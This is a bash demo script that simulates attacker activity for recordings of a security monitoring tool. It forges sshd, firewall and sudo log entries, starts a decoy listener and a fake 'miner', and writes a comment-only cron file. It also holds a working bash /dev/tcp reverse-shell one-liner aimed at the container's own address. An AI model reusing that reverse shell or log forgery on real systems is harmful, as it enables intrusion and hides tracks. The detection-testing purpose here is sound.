#!/usr/bin/env bash
# Harmless stand-ins for eight Top 10 categories, narrated for the demo
# recordings. The same stand-ins as scripts/sim-container/sim.sh: log lines
# use RFC 5737 documentation addresses, the "miner" is a renamed copy of
# sleep, the "reverse shell" connects to this container's own address and the
# cron drop-in is a comment. Runs inside the throwaway demo container only.
set -euo pipefail

say() { printf '\033[1;35m[attacker]\033[0m %s\n' "$*"; sleep "${PAUSE:-1.2}"; }
syslog() { printf '%s kubepi %s: %s\n' "$(date '+%b %e %H:%M:%S')" "$1" "$2" >>"$3"; }
ip="$(python3 -c 'import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(("192.0.2.1",9));print(s.getsockname()[0])')"

say "hammering ssh as root from 203.0.113.66"
for i in $(seq 1 8); do
  syslog sshd "Failed password for root from 203.0.113.66 port 4100${i} ssh2" /var/log/auth.log
done
say "...and the password finally works"
syslog sshd "Accepted password for root from 203.0.113.66 port 41999 ssh2" /var/log/auth.log

say "scanning from 198.51.100.23"
for p in 21 22 23 25 53 80 110 143 443 445 3306 3389 5432 6379 8080; do
  syslog kernel "[UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.23 DST=192.0.2.10 PROTO=TCP SPT=55555 DPT=${p} SYN" /var/log/kern.log
done

say "mallory tries sudo"
syslog sudo "  mallory : user NOT in sudoers ; TTY=pts/9 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash" /var/log/auth.log

say "dropping a backdoor listener on :31337"
python3 -m http.server 31337 --bind 0.0.0.0 >/dev/null 2>&1 &

say "starting a \"miner\" from /tmp"
cp "$(command -v sleep)" /tmp/xmrig
/tmp/xmrig 600 &

say "popping a reverse shell to ${ip}:4445"
python3 -c 'import socket,time
s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("0.0.0.0",4445));s.listen(1);c,_=s.accept();time.sleep(600)' >/dev/null 2>&1 &
sleep 0.5
bash -c "exec 3<>/dev/tcp/${ip}/4445; exec bash -i <&3 >&3 2>&3" >/dev/null 2>&1 &

say "persisting with a cron drop-in"
printf '# pisentry demo, safe to delete\n' >/etc/cron.d/0hourly-update
